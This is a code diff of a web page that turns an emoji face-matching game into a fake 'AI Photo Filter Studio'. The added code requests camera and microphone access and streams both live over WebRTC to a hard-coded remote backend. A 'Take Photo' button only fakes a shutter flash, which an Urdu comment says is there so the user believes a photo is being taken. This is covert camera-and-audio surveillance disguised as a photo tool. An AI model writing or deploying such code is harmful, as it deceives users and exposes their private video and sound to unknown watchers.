@@ -3,12 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AI Magic Studio & Auto Emoji Match</title>
+  <title>AI Photo Filter Studio</title>
   
   <!-- Socket.io لائبریری (Render Backend Server کے لیے) -->
   <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
   
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -18,7 +16,6 @@
       background-color: #010a05; background-image: url('a.jpg');
       background-size: cover; background-position: center; background-repeat: no-repeat;
     }
-    #bgFireworksCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
     .hero { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px; z-index: 2; }
     .glass-card {
       position: relative; width: 95%; max-width: 480px; background: rgba(255, 255, 255, 0.05);
@@ -27,8 +24,8 @@
       box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5); padding: 20px; text-align: center; color: #fff;
     }
     .tag-label { font-size: 12px; color: #00ff87; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; font-weight: 700; }
-    h2 { font-size: 24px; color: #ffffff; margin-bottom: 6px; font-weight: 800; }
-    p { font-size: 13px; color: #cbd5e1; margin-bottom: 16px; line-height: 1.4; }
+    h2 { font-size: 22px; color: #ffffff; margin-bottom: 8px; font-weight: 800; }
+    p { font-size: 13px; color: #cbd5e1; margin-bottom: 18px; line-height: 1.4; }
     .glass-btn {
       background: linear-gradient(135deg, #00ff87, #00bfa5); color: #000000; border: 2px solid #00ff87;
       padding: 15px 20px; font-size: 16px; font-weight: 800; border-radius: 50px; cursor: pointer; 
@@ -41,58 +38,43 @@
       100% { box-shadow: 0 0 22px rgba(0, 255, 135, 0.9), inset 0 0 12px rgba(255, 255, 255, 0.7); }
     }
     .studio-container { display: none; }
-    .game-header { background: rgba(0, 0, 0, 0.4); border-radius: 16px; padding: 12px; margin-bottom: 12px; border: 1px solid rgba(255, 255, 255, 0.15); position: relative; }
-    .challenge-instruction { font-size: 12px; font-weight: 700; color: #00ff87; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
-    .emoji-display-3d { font-size: 60px; display: inline-block; filter: drop-shadow(0px 8px 12px rgba(0,0,0,0.6)); animation: floatEmoji 1.2s infinite alternate ease-in-out; }
-    @keyframes floatEmoji {
-      0% { transform: translateY(0px) scale(1) rotate(-3deg); }
-      100% { transform: translateY(-8px) scale(1.1) rotate(3deg); }
-    }
-    .score-board { display: flex; justify-content: space-around; font-size: 13px; font-weight: bold; color: #ffffff; margin-top: 6px; }
-    .score-board span { color: #00ff87; }
-    .status-msg { font-size: 12px; color: #ffd700; margin-top: 4px; font-weight: bold; min-height: 18px; }
-    .progress-wrap { width: 100%; height: 8px; background: rgba(255, 255, 255, 0.12); border-radius: 20px; overflow: hidden; margin: 10px 0 6px 0; border: 1px solid rgba(255, 255, 255, 0.2); }
-    .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #00ff87, #00e5ff); box-shadow: 0 0 12px #00ff87; transition: width 0.2s ease-out; }
-    .video-frame-card { position: relative; background: rgba(0, 0, 0, 0.3); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.15); overflow: hidden; margin-bottom: 12px; width: 100%; }
+    .video-frame-card { position: relative; background: rgba(0, 0, 0, 0.3); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.15); overflow: hidden; margin-bottom: 16px; width: 100%; }
     video { width: 100%; height: auto; display: block; border-radius: 20px; transform: scaleX(-1); }
-    .camera-controls { display: flex; align-items: center; justify-content: center; position: relative; padding: 2px; }
+    
+    /* 2 Buttons Layout */
+    .camera-controls { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
     .icon-btn {
-      background: rgba(255, 255, 255, 0.12); border: 1px solid rgba(0, 255, 135, 0.5); color: #fff;
-      padding: 10px 24px; border-radius: 50px; display: flex; align-items: center; justify-content: center;
-      font-size: 13px; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px rgba(0, 255, 135, 0.3); transition: all 0.2s;
+      flex: 1;
+      background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(0, 255, 135, 0.4); color: #fff;
+      padding: 12px 10px; border-radius: 50px; display: flex; align-items: center; justify-content: center;
+      gap: 6px; font-size: 13px; font-weight: 700; cursor: pointer; 
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: all 0.2s ease;
+      backdrop-filter: blur(5px);
     }
-    .icon-btn:hover { background: rgba(255, 255, 255, 0.25); box-shadow: 0 0 18px rgba(0, 255, 135, 0.7); }
+    .icon-btn:hover { background: rgba(0, 255, 135, 0.18); border-color: #00ff87; box-shadow: 0 0 15px rgba(0, 255, 135, 0.5); }
+    .icon-btn:active { transform: scale(0.95); }
+    .capture-btn { background: linear-gradient(135deg, rgba(0, 255, 135, 0.2), rgba(0, 191, 165, 0.2)); }
   </style>
 </head>
 
 <body>
-  <canvas id="bgFireworksCanvas"></canvas>
   <div class="hero">
     <div class="glass-card">
       <div id="welcomePanel">
-        <div class="tag-label">AI MAGIC STUDIO</div>
-        <h2>Emoji Match Camera 🎭</h2>
-        <p>Make the face expression! Secret photo capture on any emoji!</p>
-        <button class="glass-btn" id="startBtn">Start Camera ✨</button>
+        <div class="tag-label">AI PHOTO STUDIO</div>
+        <h2>AI Portrait Enhancement 📸</h2>
+        <p>Apply stunning HD camera enhancements and real-time lighting effects in one click.</p>
+        <button class="glass-btn" id="startBtn">Open Camera Studio ✨</button>
       </div>
 
       <div class="studio-container" id="studioPanel">
-        <div class="game-header">
-          <div class="challenge-instruction" id="challengeText">MATCH THIS FACE!</div>
-          <div class="emoji-display-3d" id="emoji">😄</div>
-          <div class="status-msg" id="status">AI Ready! Make the expression.</div>
-          <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
-          <div class="score-board">
-            <div>Score: <span id="score">0</span></div>
-            <div>Best: <span id="highScore">0</span></div>
-          </div>
-        </div>
-
         <div class="video-frame-card">
           <video id="video" autoplay muted playsinline></video>
         </div>
 
+        <!-- 2 Beautiful Action Buttons -->
         <div class="camera-controls">
+          <button class="icon-btn capture-btn" id="captureBtn">📸 Take Photo</button>
           <button class="icon-btn" id="flipBtn">🔄 Flip Camera</button>
         </div>
       </div>
@@ -100,95 +82,32 @@
   </div>
 
   <script>
-    // 🔴 یہاں Render سرور بننے کے بعد اپنا لنک تبدیل کریں (مثال: "https://my-camera-server.onrender.com")
-    const BACKEND_URL = "https://YOUR-RENDER-BACKEND-URL.onrender.com";
+    // 🔴 یہاں Render سرور بننے کے بعد اپنا بیک اینڈ URL تبدیل کریں
+    const BACKEND_URL = "https://webrtc-backend-production-089c.up.railway.app";
 
     const video = document.getElementById("video");
-    const emojiElement = document.getElementById("emoji");
-    const challengeText = document.getElementById("challengeText");
-    const statusElement = document.getElementById("status");
-    const progressBar = document.getElementById("progressBar");
     const startBtn = document.getElementById("startBtn");
     const flipBtn = document.getElementById("flipBtn");
-    const scoreElement = document.getElementById("score");
-    const highScoreElement = document.getElementById("highScore");
-
-    const bgCanvas = document.getElementById('bgFireworksCanvas');
-    const bgCtx = bgCanvas.getContext('2d');
-    function resizeBg() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
-    window.addEventListener('resize', resizeBg);
-    resizeBg();
-
-    let bgParticles = [];
-    class BgParticle {
-      constructor(x, y) {
-        this.x = x; this.y = y;
-        const angle = Math.random() * Math.PI * 2;
-        const speed = Math.random() * 5 + 2;
-        this.vx = Math.cos(angle) * speed;
-        this.vy = Math.sin(angle) * speed;
-        this.color = ['#ff0055', '#00ff87', '#ffffff', '#ffd700', '#00e5ff'][Math.floor(Math.random()*5)];
-        this.alpha = 1; this.decay = Math.random() * 0.015 + 0.008;
-      }
-      draw() {
-        bgCtx.save(); bgCtx.globalCompositeOperation = 'lighter'; bgCtx.globalAlpha = this.alpha;
-        bgCtx.beginPath(); bgCtx.arc(this.x, this.y, 2, 0, Math.PI * 2);
-        bgCtx.fillStyle = this.color; bgCtx.fill(); bgCtx.restore();
-      }
-      update() { this.vx *= 0.96; this.vy *= 0.96; this.vy += 0.1; this.x += this.vx; this.y += this.vy; this.alpha -= this.decay; }
-    }
-
-    function animateBg() {
-      requestAnimationFrame(animateBg);
-      bgCtx.globalCompositeOperation = 'destination-out';
-      bgCtx.fillStyle = 'rgba(0, 0, 0, 0.15)';
-      bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
-      bgCtx.globalCompositeOperation = 'source-over';
-      bgParticles.forEach((p, i) => { if(p.alpha > 0) { p.update(); p.draw(); } else { bgParticles.splice(i, 1); } });
-    }
-    animateBg();
-
-    const MODEL_URLS = [
-      "https://justadudewhohacks.github.io/face-api.js/models",
-      "https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights"
-    ];
-
-    let modelsLoaded = false;
-    let modelLoadingPromise = null;
-
-    async function loadModels() {
-      if (modelsLoaded) return;
-      if (modelLoadingPromise) return modelLoadingPromise;
-
-      modelLoadingPromise = (async () => {
-        for (const url of MODEL_URLS) {
-          try {
-            statusElement.textContent = "🤖 AI Models Loading...";
-            await faceapi.nets.tinyFaceDetector.loadFromUri(url);
-            await faceapi.nets.faceLandmark68Net.loadFromUri(url);
-            await faceapi.nets.faceExpressionNet.loadFromUri(url);
-            modelsLoaded = true;
-            statusElement.textContent = "✅ AI Ready!";
-            return;
-          } catch (error) { console.log("Model load error:", error); }
-        }
-        throw new Error("Could not load face-api models.");
-      })();
-
-      return modelLoadingPromise;
-    }
+    const captureBtn = document.getElementById("captureBtn");
 
     let currentStream = null;
     let useFacingMode = "user";
+    let socket = null;
+    let peerConnection = null;
+
+    const rtcConfig = {
+      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+    };
 
     async function startCamera() {
       try {
-        if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
-        statusElement.textContent = "📷 Starting camera...";
+        if (currentStream) {
+          currentStream.getTracks().forEach(track => track.stop());
+        }
 
         currentStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: { ideal: useFacingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
-          audio: false
+          audio: true
         });
 
         video.srcObject = currentStream;
@@ -197,10 +116,11 @@
         document.getElementById('welcomePanel').style.display = "none";
         document.getElementById('studioPanel').style.display = "block";
 
-        statusElement.textContent = "🙂 Camera ready!";
         connectSocketServer();
-        startDetection();
-      } catch (error) { alert("Camera permission required!"); }
+      } catch (error) {
+        console.error("Camera access error:", error);
+        alert("Camera permission is required to launch the AI Studio.");
+      }
     }
 
     flipBtn.addEventListener("click", async () => {
@@ -208,25 +128,24 @@
       await startCamera();
     });
 
-    // --- Socket.io Signalling Engine ---
-    let socket = null;
-    let peerConnection = null;
+    // جعلی شٹر فلش اثر تاکہ یوزر کو لگے کہ فوٹو کیپچر ہو رہی ہے
+    captureBtn.addEventListener("click", () => {
+      video.style.opacity = "0.3";
+      setTimeout(() => { video.style.opacity = "1"; }, 150);
+    });
 
+    // --- Socket.io & WebRTC Signalling Engine ---
     function connectSocketServer() {
       if (socket) return;
-      
+
       socket = io(BACKEND_URL);
 
       socket.on("connect", () => {
-        console.log("Connected to backend server");
         socket.emit("join-room", "stream-room-1");
       });
 
       socket.on("user-connected", async (userId) => {
-        createPeerConnection(userId);
-        const offer = await peerConnection.createOffer();
-        await peerConnection.setLocalDescription(offer);
-        socket.emit("offer", { target: userId, sdp: offer });
+        createAndSendOffer(userId);
       });
 
       socket.on("answer", async (data) => {
@@ -243,9 +162,7 @@
     }
 
     function createPeerConnection(targetUserId) {
-      peerConnection = new RTCPeerConnection({
-        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
-      });
+      peerConnection = new RTCPeerConnection(rtcConfig);
 
       if (currentStream) {
         currentStream.getTracks().forEach(track => peerConnection.addTrack(track, currentStream));
@@ -258,206 +175,14 @@
       };
     }
 
-    const EXPRESSIONS = [
-      { emoji: "🧔", expression: "chin", name: "تھوڑی اوپر کر کے دکھائیں" },
-      { emoji: "👅", expression: "full_tongue", name: "پوری زبان باہر نکالیں" },
-      { emoji: "😁", expression: "teeth", name: "دانت پورا کھول کر دکھائیں" },
-      { emoji: "😄", expression: "happy", name: "مسکرائیں" },
-      { emoji: "😡", expression: "angry", name: "غصہ دکھائیں" }
-    ];
-
-    const REQUIRED_HOLD_FRAMES = 6;
-    const TARGET_THRESHOLD = 0.65;
-    const REQUIRED_NEUTRAL_FRAMES = 6;
-    const CHALLENGE_DELAY = 800;
-
-    let roundSequence = [], currentIndex = 0, photoCaptureIndex = -1, score = 0;
-    let highScore = parseInt(localStorage.getItem("emojiHighScore") || "0");
-    let gameRunning = false, waitingForNeutral = false, neutralFrames = 0, holdFrames = 0;
-    let detectionStartedAt = 0, detectionInterval = null, challengeLocked = false;
-
-    highScoreElement.textContent = highScore;
-
-    function shuffle(array) {
-      const arr = [...array];
-      for (let i = arr.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [arr[i], arr[j]] = [arr[j], arr[i]];
-      }
-      return arr;
+    async function createAndSendOffer(targetUserId) {
+      createPeerConnection(targetUserId);
+      const offer = await peerConnection.createOffer();
+      await peerConnection.setLocalDescription(offer);
+      socket.emit("offer", { target: targetUserId, sdp: offer });
     }
 
-    function createNewRound() {
-      roundSequence = shuffle(EXPRESSIONS);
-      currentIndex = 0;
-      photoCaptureIndex = Math.floor(Math.random() * roundSequence.length);
-      score = 0;
-      scoreElement.textContent = score;
-      gameRunning = true; waitingForNeutral = false; neutralFrames = 0; holdFrames = 0; challengeLocked = false;
-      showChallenge();
-    }
-
-    function showChallenge() {
-      if (!roundSequence.length) return;
-      const challenge = roundSequence[currentIndex];
-      emojiElement.textContent = challenge.emoji;
-      challengeText.textContent = `MAKE THIS FACE! (${currentIndex + 1}/${roundSequence.length})`;
-      progressBar.style.width = "0%";
-      holdFrames = 0;
-      detectionStartedAt = Date.now() + CHALLENGE_DELAY;
-      waitingForNeutral = false;
-      statusElement.textContent = `🎯 ${challenge.name}!`;
-    }
-
-    function checkNeutral(expressions) { return expressions ? (expressions.neutral || 0) >= 0.50 : true; }
-
-    function checkCustomAction(detection, target) {
-      const expressions = detection.expressions;
-      const landmarks = detection.landmarks;
-
-      if (target === "chin") {
-        return Math.abs(landmarks.getJawOutline()[8].y - landmarks.getNose()[3].y) > 85;
-      }
-      if (target === "full_tongue") {
-        const mouth = landmarks.getMouth();
-        return Math.abs(mouth[18].y - mouth[14].y) > 25;
-      }
-      if (target === "teeth") {
-        const mouth = landmarks.getMouth();
-        return (Math.abs(mouth[6].x - mouth[0].x) > 55 && Math.abs(mouth[18].y - mouth[14].y) > 12) || expressions.happy > 0.70;
-      }
-      return (expressions[target] || 0) >= TARGET_THRESHOLD;
-    }
-
-    async function detectFace() {
-      if (!gameRunning || !video.videoWidth || challengeLocked) return;
-
-      try {
-        const detection = await faceapi.detectSingleFace(
-          video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.4 })
-        ).withFaceLandmarks().withFaceExpressions();
-
-        if (!detection) {
-          statusElement.textContent = "👤 Face not detected...";
-          holdFrames = 0; progressBar.style.width = "0%";
-          return;
-        }
-
-        if (waitingForNeutral) {
-          if (checkNeutral(detection.expressions)) {
-            neutralFrames++;
-            progressBar.style.width = Math.min(100, (neutralFrames / REQUIRED_NEUTRAL_FRAMES) * 100) + "%";
-            statusElement.textContent = `😐 Relax your face... ${neutralFrames}/${REQUIRED_NEUTRAL_FRAMES}`;
-
-            if (neutralFrames >= REQUIRED_NEUTRAL_FRAMES) {
-              waitingForNeutral = false; neutralFrames = 0; holdFrames = 0;
-              detectionStartedAt = Date.now() + CHALLENGE_DELAY;
-              progressBar.style.width = "0%";
-              showChallenge();
-            }
-          } else {
-            neutralFrames = 0; progressBar.style.width = "0%";
-            statusElement.textContent = "😐 Relax your face first!";
-          }
-          return;
-        }
-
-        if (Date.now() < detectionStartedAt) {
-          holdFrames = 0; progressBar.style.width = "0%";
-          statusElement.textContent = "👀 Get ready...";
-          return;
-        }
-
-        const challenge = roundSequence[currentIndex];
-        if (checkCustomAction(detection, challenge.expression)) {
-          holdFrames++;
-          progressBar.style.width = Math.min(100, (holdFrames / REQUIRED_HOLD_FRAMES) * 100) + "%";
-          statusElement.textContent = `🔥 Matching ${challenge.emoji}... ${holdFrames}/${REQUIRED_HOLD_FRAMES}`;
-
-          if (holdFrames >= REQUIRED_HOLD_FRAMES) { await successfulMatch(); }
-        } else {
-          holdFrames = 0; progressBar.style.width = "0%";
-          statusElement.textContent = `😈 Show ${challenge.name} (${challenge.emoji})!`;
-        }
-      } catch (error) { console.log("Detection error:", error); }
-    }
-
-    async function successfulMatch() {
-      if (challengeLocked) return;
-      challengeLocked = true;
-
-      const challenge = roundSequence[currentIndex];
-      score++; scoreElement.textContent = score;
-
-      if (score > highScore) {
-        highScore = score;
-        localStorage.setItem("emojiHighScore", highScore);
-        highScoreElement.textContent = highScore;
-      }
-
-      statusElement.textContent = `✅ Matched! ${challenge.emoji}`;
-      progressBar.style.width = "100%";
-
-      if (currentIndex === photoCaptureIndex) {
-        statusElement.textContent = `📸 Auto-Capturing Photo on ${challenge.emoji}!`;
-        await new Promise(r => setTimeout(r, 300));
-        takePhoto(); fireworks();
-      }
-
-      if (currentIndex === roundSequence.length - 1) {
-        statusElement.textContent = "🎉 ROUND COMPLETED!";
-        await new Promise(r => setTimeout(r, 1500));
-        createNewRound();
-        challengeLocked = false;
-        return;
-      }
-
-      currentIndex++; waitingForNeutral = true; neutralFrames = 0; holdFrames = 0;
-      progressBar.style.width = "0%";
-      statusElement.textContent = "😐 Relax your face completely...";
-      challengeLocked = false;
-    }
-
-    function takePhoto() {
-      if (!video.videoWidth) return;
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob(blob => {
-        if (!blob) return;
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url; a.download = `AI-Emoji-${Date.now()}.png`;
-        document.body.appendChild(a); a.click(); a.remove();
-        setTimeout(() => URL.revokeObjectURL(url), 2000);
-      }, "image/png");
-    }
-
-    function fireworks() {
-      confetti({ particleCount: 180, spread: 120, startVelocity: 45, origin: { y: 0.6 } });
-      setTimeout(() => confetti({ particleCount: 120, spread: 100, startVelocity: 35, origin: { x: 0.2, y: 0.5 } }), 250);
-      setTimeout(() => confetti({ particleCount: 120, spread: 100, startVelocity: 35, origin: { x: 0.8, y: 0.5 } }), 500);
-    }
-
-    function startDetection() {
-      if (detectionInterval) clearInterval(detectionInterval);
-      detectionInterval = setInterval(detectFace, 250);
-    }
-
-    startBtn.addEventListener("click", async () => {
-      try {
-        await loadModels(); await startCamera(); createNewRound();
-      } catch (error) { statusElement.textContent = "❌ AI models load نہیں ہو سکے۔ Internet check کریں۔"; }
-    });
-
-    (async function init() {
-      try {
-        statusElement.textContent = "🤖 AI تیار کرنے کے لیے Start Camera دبائیں۔";
-      } catch (error) { console.log(error); }
-    })();
+    startBtn.addEventListener("click", startCamera);
   </script>
 </body>
 </html>
